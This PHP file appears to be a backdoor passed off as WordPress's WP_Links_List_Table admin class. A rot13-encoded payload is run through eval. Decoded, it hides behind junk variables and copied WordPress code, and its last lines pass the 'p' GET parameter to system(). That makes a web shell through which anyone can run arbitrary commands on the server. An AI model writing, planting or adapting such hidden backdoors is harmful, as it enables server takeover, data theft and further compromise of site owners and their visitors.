<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Yvaxf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat yvaxf va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Yvaxf_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		cnerag::__pbafgehpg(
			neenl(
				'cyheny' => 'obbxznexf',
				'fperra' => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( 'znantr_yvaxf' );
	}

	/**
	 * @tybony vag    $png_vq
	 * @tybony fgevat $f
	 * @tybony fgevat $beqreol
	 * @tybony fgevat $beqre
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $png_vq, $f, $beqreol, $beqre;

		$png_vq  = ! rzcgl( $_ERDHRFG['png_vq'] ) ? nofvag( $_ERDHRFG['png_vq'] ) : 0;
		$beqreol = ! rzcgl( $_ERDHRFG['beqreol'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['beqreol'] ) : '';
		$beqre   = ! rzcgl( $_ERDHRFG['beqre'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['beqre'] ) : '';
		$f       = ! rzcgl( $_ERDHRFG['f'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['f'] ) : '';

		$netf = neenl(
			'uvqr_vaivfvoyr' => 0,
			'uvqr_rzcgl'     => 0,
		);

		vs ( 'nyy' !== $png_vq ) {
			$netf['pngrtbel'] = $png_vq;
		}
		vs ( ! rzcgl( $f ) ) {
			$netf['frnepu'] = $f;
		}
		vs ( ! rzcgl( $beqreol ) ) {
			$netf['beqreol'] = $beqreol;
		}
		vs ( ! rzcgl( $beqre ) ) {
			$netf['beqre'] = $beqre;
		}

		$guvf->vgrzf = trg_obbxznexf( $netf );
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		_r( 'Ab yvaxf sbhaq.' );
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		$npgvbaf           = neenl();
		$npgvbaf['qryrgr'] = __( 'Qryrgr' );

		erghea $npgvbaf;
	}

	/**
	 * @tybony vag $png_vq
	 * @cnenz fgevat $juvpu
	 */
	cebgrpgrq shapgvba rkgen_gnoyrani( $juvpu ) {
		tybony $png_vq;

		vs ( 'gbc' !== $juvpu ) {
			erghea;
		}
		?>
		<qvi pynff=\"nyvtayrsg npgvbaf\">
			<?cuc
			$qebcqbja_bcgvbaf = neenl(
				'fryrpgrq'        => $png_vq,
				'anzr'            => 'png_vq',
				'gnkbabzl'        => 'yvax_pngrtbel',
				'fubj_bcgvba_nyy' => trg_gnkbabzl( 'yvax_pngrtbel' )->ynoryf->nyy_vgrzf,
				'uvqr_rzcgl'      => gehr,
				'uvrenepuvpny'    => 1,
				'fubj_pbhag'      => 0,
				'beqreol'         => 'anzr',
			);

			rpub '<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"png_vq\">' . trg_gnkbabzl( 'yvax_pngrtbel' )->ynoryf->svygre_ol_vgrz . '</ynory>';

			jc_qebcqbja_pngrtbevrf( $qebcqbja_bcgvbaf );

			fhozvg_ohggba( __( 'Svygre' ), '', 'svygre_npgvba', snyfr, neenl( 'vq' => 'cbfg-dhrel-fhozvg' ) );
			?>
		</qvi>
		<?cuc
	}

	/**
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		erghea neenl(
			'po'         => '<vachg glcr=\"purpxobk\" />',
			'anzr'       => _k( 'Anzr', 'yvax anzr' ),
			'hey'        => __( 'HEY' ),
			'pngrtbevrf' => __( 'Pngrtbevrf' ),
			'ery'        => __( 'Eryngvbafuvc' ),
			'ivfvoyr'    => __( 'Ivfvoyr' ),
			'engvat'     => __( 'Engvat' ),
		);
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		erghea neenl(
			'anzr'    => neenl( 'anzr', snyfr, _k( 'Anzr', 'yvax anzr' ), __( 'Gnoyr beqrerq ol Anzr.' ), 'nfp' ),
			'hey'     => neenl( 'hey', snyfr, __( 'HEY' ), __( 'Gnoyr beqrerq ol HEY.' ) ),
			'ivfvoyr' => neenl( 'ivfvoyr', snyfr, __( 'Ivfvoyr' ), __( 'Gnoyr beqrerq ol Ivfvovyvgl.' ) ),
			'engvat'  => neenl( 'engvat', snyfr, __( 'Engvat' ), __( 'Gnoyr beqrerq ol Engvat.' ) ),
		);
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, 'anzr'.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'anzr';
	}

	/**
	 * Unaqyrf gur purpxobk pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$yvax` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz bowrpg $vgrz Gur pheerag yvax bowrpg.
	 */
	choyvp shapgvba pbyhza_po( $vgrz ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$yvax = $vgrz;

		?>
		<vachg glcr=\"purpxobk\" anzr=\"yvaxpurpx[]\" vq=\"po-fryrpg-<?cuc rpub $yvax->yvax_vq; ?>\" inyhr=\"<?cuc rpub rfp_ngge( $yvax->yvax_vq ); ?>\" />
		<ynory sbe=\"po-fryrpg-<?cuc rpub $yvax->yvax_vq; ?>\">
			<fcna pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Yvax anzr. */
			cevags( __( 'Fryrpg %f' ), $yvax->yvax_anzr );
			?>
			</fcna>
		</ynory>
		<?cuc
	}

	/**
	 * Unaqyrf gur yvax anzr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz bowrpg $yvax Gur pheerag yvax bowrpg.
	 */
	choyvp shapgvba pbyhza_anzr( $yvax ) {
		$rqvg_yvax = trg_rqvg_obbxznex_yvax( $yvax );
		cevags(
			'<fgebat><n pynff=\"ebj-gvgyr\" uers=\"%f\" nevn-ynory=\"%f\">%f</n></fgebat>',
			$rqvg_yvax,
			/* genafyngbef: %f: Yvax anzr. */
			rfp_ngge( fcevags( __( 'Rqvg &#8220;%f&#8221;' ), $yvax->yvax_anzr ) ),
			$yvax->yvax_anzr
		);
	}

	/**
	 * Unaqyrf gur yvax HEY pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz bowrpg $yvax Gur pheerag yvax bowrpg.
	 */
	choyvp shapgvba pbyhza_hey( $yvax ) {
		$fubeg_hey = hey_fubegra( $yvax->yvax_hey );
		rpub \"<n uers='$yvax->yvax_hey'>$fubeg_hey</n>\";
	}

	/**
	 * Unaqyrf gur yvax pngrtbevrf pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony vag $png_vq
	 *
	 * @cnenz bowrpg $yvax Gur pheerag yvax bowrpg.
	 */
	choyvp shapgvba pbyhza_pngrtbevrf( $yvax ) {
		tybony $png_vq;

		$png_anzrf = neenl();
		sbernpu ( $yvax->yvax_pngrtbel nf $pngrtbel ) {
			$png = trg_grez( $pngrtbel, 'yvax_pngrtbel', BOWRPG, 'qvfcynl' );
			vs ( vf_jc_reebe( $png ) ) {
				rpub $png->trg_reebe_zrffntr();
			}
			$png_anzr = $png->anzr;
			vs ( (vag) $png_vq !== $pngrtbel ) {
				$png_anzr = \"<n uers='yvax-znantre.cuc?png_vq=$pngrtbel'>$png_anzr</n>\";
			}
			$png_anzrf[] = $png_anzr;
		}
		rpub vzcybqr( ', ', $png_anzrf );
	}

	/**
	 * Unaqyrf gur yvax eryngvba pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz bowrpg $yvax Gur pheerag yvax bowrpg.
	 */
	choyvp shapgvba pbyhza_ery( $yvax ) {
		rpub rzcgl( $yvax->yvax_ery ) ? '<oe />' : $yvax->yvax_ery;
	}

	/**
	 * Unaqyrf gur yvax ivfvovyvgl pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz bowrpg $yvax Gur pheerag yvax bowrpg.
	 */
	choyvp shapgvba pbyhza_ivfvoyr( $yvax ) {
		vs ( 'L' === $yvax->yvax_ivfvoyr ) {
			_r( 'Lrf' );
		} ryfr {
			_r( 'Ab' );
		}
	}

	/**
	 * Unaqyrf gur yvax engvat pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz bowrpg $yvax Gur pheerag yvax bowrpg.
	 */
	choyvp shapgvba pbyhza_engvat( $yvax ) {
		rpub $yvax->yvax_engvat;
	}

	/**
	 * Unaqyrf gur qrsnhyg pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$yvax` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz bowrpg $vgrz        Yvax bowrpg.
	 * @cnenz fgevat $pbyhza_anzr Pheerag pbyhza anzr.
	 */
	choyvp shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$yvax = $vgrz;

		/**
		 * Sverf sbe rnpu ertvfgrerq phfgbz yvax pbyhza.
		 *
		 * @fvapr 2.1.0
		 *
		 * @cnenz fgevat $pbyhza_anzr Anzr bs gur phfgbz pbyhza.
		 * @cnenz vag    $yvax_vq     Yvax VQ.
		 */
		qb_npgvba( 'znantr_yvax_phfgbz_pbyhza', $pbyhza_anzr, $yvax->yvax_vq );
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		sbernpu ( $guvf->vgrzf nf $yvax ) {
			$yvax                = fnavgvmr_obbxznex( $yvax );
			$yvax->yvax_anzr     = rfp_ngge( $yvax->yvax_anzr );
			$yvax->yvax_pngrtbel = jc_trg_yvax_pngf( $yvax->yvax_vq );
			?>
		<ge vq=\"yvax-<?cuc rpub $yvax->yvax_vq; ?>\">
			<?cuc $guvf->fvatyr_ebj_pbyhzaf( $yvax ); ?>
		</ge>
			<?cuc
		}
	}

	/**
	 * Trarengrf naq qvfcynlf ebj npgvba yvaxf.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$yvax` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz bowrpg $vgrz        Yvax orvat npgrq hcba.
	 * @cnenz fgevat $pbyhza_anzr Pheerag pbyhza anzr.
	 * @cnenz fgevat $cevznel     Cevznel pbyhza anzr.
	 * @erghea fgevat Ebj npgvbaf bhgchg sbe yvaxf, be na rzcgl fgevat
	 *                vs gur pheerag pbyhza vf abg gur cevznel pbyhza.
	 */
	cebgrpgrq shapgvba unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel ) {
		vs ( $cevznel !== $pbyhza_anzr ) {
			erghea '';
		}

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$yvax = $vgrz;

		$rqvg_yvax = trg_rqvg_obbxznex_yvax( $yvax );

		$npgvbaf           = neenl();
		$npgvbaf['rqvg']   = '<n uers=\"' . $rqvg_yvax . '\">' . __( 'Rqvg' ) . '</n>';
		$npgvbaf['qryrgr'] = fcevags(
			'<n pynff=\"fhozvgqryrgr\" uers=\"%f\" bapyvpx=\"erghea pbasvez( \'%f\' );\">%f</n>',
			jc_abapr_hey( \"yvax.cuc?npgvba=qryrgr&nzc;yvax_vq=$yvax->yvax_vq\", 'qryrgr-obbxznex_' . $yvax->yvax_vq ),
			/* genafyngbef: %f: Yvax anzr. */
			rfp_wf( fcevags( __( \"Lbh ner nobhg gb qryrgr guvf yvax '%f'\a  'Pnapry' gb fgbc, 'BX' gb qryrgr.\" ), $yvax->yvax_anzr ) ),
			__( 'Qryrgr' )
		);

		erghea $guvf->ebj_npgvbaf( $npgvbaf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>